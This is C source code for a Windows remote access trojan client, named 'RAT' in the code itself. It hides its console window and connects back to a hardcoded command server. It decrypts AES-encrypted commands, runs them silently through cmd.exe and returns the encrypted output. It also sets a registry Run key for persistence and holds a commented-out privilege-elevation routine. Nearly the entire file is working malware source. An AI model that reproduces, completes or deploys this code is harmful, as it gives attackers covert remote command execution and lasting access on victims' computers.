#ifndef _CRT_SECURE_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#endif

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <bcrypt.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <openssl/pem.h>
#include <openssl/evp.h>
#include <openssl/ssl.h>
#include <openssl/applink.c>

#include "base64.h"

#define SVPORT 8008
#define CLPORT 8009
#define BUFSIZE 4096
#define KEYLEN 32
#define IVLEN 16

// void ELEVATE()
// {
//     if(IsUserAdmin())
//     {
//         printf("alr admin\n");
//         return;
//     }
//
//     char path[MAX_PATH];
//     HMODULE hModule = GetModuleHandle(NULL);
//     GetModuleFileName(hModule, path, MAX_PATH);
//
//     SHELLEXECUTEINFO sei;
//     sei.cbSize = sizeof(sei);
//     sei.lpVerb = "runas";
//     sei.lpFile = path;
//     sei.nShow = SW_SHOWNORMAL;
//     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
//
//     if(!ShellExecuteEx(&sei))
//     {
//         printf("ShellExecuteEx Failed: %lu\n", GetLastError());
//         return;
//     }
// }

void sendall(int sockfd, unsigned char* buffer, size_t length)
{
    size_t sentTotal = 0;
    size_t sent = 0;

    while (sentTotal < length)
    {
        sent = send(sockfd, (const char*)buffer + sentTotal, length - sentTotal, 0);
        if (sent == -1)
        {
            perror("Send error\n");
            exit(EXIT_FAILURE);
        }

        sentTotal += sent;
    }
}

int encryptAES(unsigned char* plaintext, int plaintextLen, unsigned char* key, unsigned char* iv, unsigned char** ciphertext)
{
    EVP_CIPHER_CTX* ctx;
    int len;
    int ciphertextLen;
    int blkSize = 16;

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, *ciphertext, &len, plaintext, plaintextLen);
    ciphertextLen = len;
    EVP_EncryptFinal_ex(ctx, *ciphertext + len, &len);
    ciphertextLen += len;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertextLen;
}

int decryptAES(unsigned char* ciphertext, int ciphertextLen, unsigned char* key, unsigned char* iv, unsigned char** decryptedtext)
{
    EVP_CIPHER_CTX* ctx;
    int len;
    int plaintextLen;

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, *decryptedtext, &len, ciphertext, ciphertextLen);
    plaintextLen = len;

    EVP_DecryptFinal_ex(ctx, *decryptedtext + len, &len);
    plaintextLen += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintextLen;
}

int CNG_AES256_CBC_Encrypt(unsigned const* plaintext, unsigned char* key, unsigned char* iv, unsigned char* ciphertext)
{
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
	BCRYPT_KEY_HANDLE hKey  = NULL;
    DWORD cbCiphertext = 0,
        cbPlaintext = 0,
        cbData = 0,
        cbKeyObject = 0;
    NTSTATUS status = 0;
    PBYTE pbCiphertext = NULL,
        pbPlaintext = NULL,
        pbKeyObject = NULL,
        pbIV = NULL;

    status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
	status = BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);

    cbPlaintext = strlen(plaintext);
    pbPlaintext = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlaintext);
    memcpy(pbPlaintext, plaintext, cbPlaintext);

    pbIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IVLEN);
    memcpy(pbIV, iv, IVLEN);

    status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, KEYLEN, 0);
    status = BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, NULL, pbIV, IVLEN, NULL, 0, &cbCiphertext, BCRYPT_BLOCK_PADDING); 
    
    pbCiphertext = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCiphertext);
    status = BCryptEncrypt(hKey, pbPlaintext, cbPlaintext, NULL, pbIV, IVLEN, pbCiphertext, cbCiphertext, &cbData, BCRYPT_BLOCK_PADDING);

    //Swapping cbCiphertext to free it
    memcpy(ciphertext, pbCiphertext, cbData);
    int ciphertextLen = cbData;

    //After encryption cleanup
    if (hAesAlg)
    {
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
    }

    if (hKey)
    {
        BCryptDestroyKey(hKey);
    }

    if (pbPlaintext)
    {
        HeapFree(GetProcessHeap(), 0, pbPlaintext);
    }

    if (pbKeyObject)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }

    if (pbIV)
    {
        HeapFree(GetProcessHeap(), 0, pbIV);
    }

    if (pbCiphertext)
    {
        HeapFree(GetProcessHeap(), 0, pbCiphertext);
    }

    return ciphertextLen;
}

//unsigned char* ciphertext, int ciphertextLen, unsigned char* key, unsigned char* iv, unsigned char** decryptedtext
int CNG_AES256_CBC_Decrypt(unsigned char* ciphertext, int ciphertextLen, unsigned char* key, unsigned char* iv, unsigned char* plaintext)
{
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbCiphertext = 0,
        cbPlaintext = 0,
        cbData = 0,
        cbKeyObject = 0;
    NTSTATUS status = 0;
    PBYTE pbCiphertext = NULL,
        pbPlaintext = NULL,
        pbKeyObject = NULL,
        pbIV = NULL,
        pbBlob = NULL;


    status = BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    status = BCryptGetProperty(hAesAlg, BCRYPT_OBJECT_LENGTH, (PBYTE) &cbKeyObject, sizeof(DWORD), &cbData, 0);
    pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);

    pbIV = HeapAlloc(GetProcessHeap(), 0, IVLEN);
    memcpy(pbIV, iv, IVLEN);

    cbCiphertext = ciphertextLen;
    pbCiphertext = HeapAlloc(GetProcessHeap(), 0, cbCiphertext);
    memcpy(pbCiphertext, ciphertext, cbCiphertext);

    status = BCryptSetProperty(hAesAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    status = BCryptGenerateSymmetricKey(hAesAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, KEYLEN, 0);
    status = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, NULL, pbIV, IVLEN, NULL, 0, &cbPlaintext, BCRYPT_BLOCK_PADDING);
    
    pbPlaintext = HeapAlloc(GetProcessHeap(), 0, cbPlaintext);
    memset(pbPlaintext, 0, cbPlaintext);
    status = BCryptDecrypt(hKey, pbCiphertext, cbCiphertext, NULL, pbIV, IVLEN, pbPlaintext, cbPlaintext, &cbData, BCRYPT_BLOCK_PADDING);
    
    //Swapping values to free them
    memcpy(plaintext, pbPlaintext, cbData);
    int plaintextLen = cbData;

    if (hAesAlg)
    {
        BCryptCloseAlgorithmProvider(hAesAlg, 0);
    }

    if (hKey)
    {
        BCryptDestroyKey(hKey);
    }

    if (pbPlaintext)
    {
        HeapFree(GetProcessHeap(), 0, pbPlaintext);
    }

    if (pbKeyObject)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }

    if (pbIV)
    {
        HeapFree(GetProcessHeap(), 0, pbIV);
    }

    if (pbCiphertext)
    {
        HeapFree(GetProcessHeap(), 0, pbCiphertext);
    }
    
    return plaintextLen;
}

char* CMD_Execute_Command(char* command, size_t* resultLen)
{
    SECURITY_ATTRIBUTES sa;
	memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	HANDLE hStdOutRd, hStdOutWr;
	HANDLE hStdErrRd, hStdErrWr;

	CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0);
	CreatePipe(&hStdErrRd, &hStdErrWr, &sa, 0);

	SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStdErrRd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFO si;
    memset(&si, 0, sizeof(si));
	si.cb = sizeof(STARTUPINFO);
    si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hStdOutWr;
	si.hStdError = hStdOutWr;

    PROCESS_INFORMATION pi;
	memset(&pi, 0, sizeof(pi));

    char fullCmdLine[BUFSIZE];
    snprintf(fullCmdLine, BUFSIZE, "cmd.exe /c %s", command);

    wchar_t wCmdLine[BUFSIZE];
    MultiByteToWideChar(CP_UTF8, 0, fullCmdLine, -1, wCmdLine, BUFSIZE);

    BOOL bSuccess = CreateProcessW(NULL, wCmdLine, NULL, NULL, TRUE, HIGH_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
	CloseHandle(hStdOutWr);

    //Read from pipe
	char buffer[BUFSIZE + 1] = { 0 };
    DWORD dwRead = 0;
    size_t totalSize = 1;
    char* result = malloc(1);
	memset(result, 0, totalSize);
    BOOL success = FALSE;

	success = ReadFile(hStdOutRd, buffer, BUFSIZE, &dwRead, NULL);
    while (success == TRUE)
    {
		buffer[dwRead] = '\0';
		totalSize += dwRead;
        result = realloc(result, totalSize);
		strcat(result, buffer);
		success = ReadFile(hStdOutRd, buffer, BUFSIZE, &dwRead, NULL);
    }
    *resultLen = totalSize;

    CloseHandle(hStdOutRd);
    CloseHandle(hStdErrRd);
    CloseHandle(hStdErrWr);

    return result;
}

void PERSIST()
{
    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR valueName = "RAT";
    LPCSTR newValue = "C:\\Windows\\RAT.exe";

    RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)newValue, strlen(newValue) + 1);
    RegCloseKey(hKey);
}

void DisableWindow()
{
    HWND hWindow = GetConsoleWindow();
    ShowWindow(hWindow, SW_HIDE);

    DWORD pId = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId);
    
    FreeConsole();
}

//APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLine, int nCmdShow)
{
    DisableWindow();
    
    //SOCKET CONNECTOR
    WSADATA wsaData;

    char serverIP[] = "10.77.252.111";
    int serverPort = SVPORT;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    struct sockaddr_in serverInfo;
    serverInfo.sin_family = AF_INET;
    serverInfo.sin_addr.s_addr = inet_addr(serverIP);
    serverInfo.sin_port = htons(serverPort);
    printf("Connecting\n");

    while (connect(sockfd, (SOCKADDR*)&serverInfo, sizeof(serverInfo)) != 0)
    {
        printf("Reconnecting\n");
        Sleep(100);
    }

    unsigned char aes_key[32];
    recv(sockfd, aes_key, sizeof(aes_key), 0);

    char recvBuffer[1025];
    while (1)
    {
        memset(recvBuffer, 0, sizeof(recvBuffer));

        char recvCiphertextLen[10];
        recvCiphertextLen[10 - 1] = '\0';
        recv(sockfd, recvCiphertextLen, sizeof(recvCiphertextLen), 0);

        int ciphertextCommandLen = atoi(recvCiphertextLen);

        unsigned char* recvAESText = malloc(ciphertextCommandLen + EVP_MAX_IV_LENGTH);
        int recvAESTextLen = ciphertextCommandLen + EVP_MAX_IV_LENGTH;
        recv(sockfd, (char*)recvAESText, recvAESTextLen, 0);

        unsigned char iv[EVP_MAX_IV_LENGTH];
        unsigned char* aesCiphertext = malloc(ciphertextCommandLen);
        memcpy(aesCiphertext, recvAESText, ciphertextCommandLen);
        memcpy(iv, recvAESText + ciphertextCommandLen, EVP_MAX_IV_LENGTH);

        unsigned char* plaintextCommand = malloc(ciphertextCommandLen + EVP_MAX_BLOCK_LENGTH);
        int plaintextCommandLen = CNG_AES256_CBC_Decrypt(aesCiphertext, ciphertextCommandLen, aes_key, iv, plaintextCommand);
        plaintextCommand[plaintextCommandLen] = '\0';

        free(aesCiphertext);
        if (strncmp(plaintextCommand, "persist", strlen("persist") == 0))
        {
            PERSIST();
        }
        else
        {
			size_t resultLen = 0;
            char* result = CMD_Execute_Command(plaintextCommand, &resultLen);

            unsigned char* sendCiphertext = malloc(resultLen + 16);
            int sendCiphertextLen = CNG_AES256_CBC_Encrypt(result, aes_key, iv, sendCiphertext);
            
            //TODO: Switch to 13 bytes
            char sendAESLen[10];
            sendAESLen[10 - 1] = '\0';
            sprintf(sendAESLen, "%d", sendCiphertextLen);
            send(sockfd, sendAESLen, sizeof(sendAESLen), 0);
            Sleep(100);
            sendall(sockfd, sendCiphertext, sendCiphertextLen);

			free(result);
            free(plaintextCommand);
            free(recvAESText);
            free(sendCiphertext);
        }
    }
    return 0;
}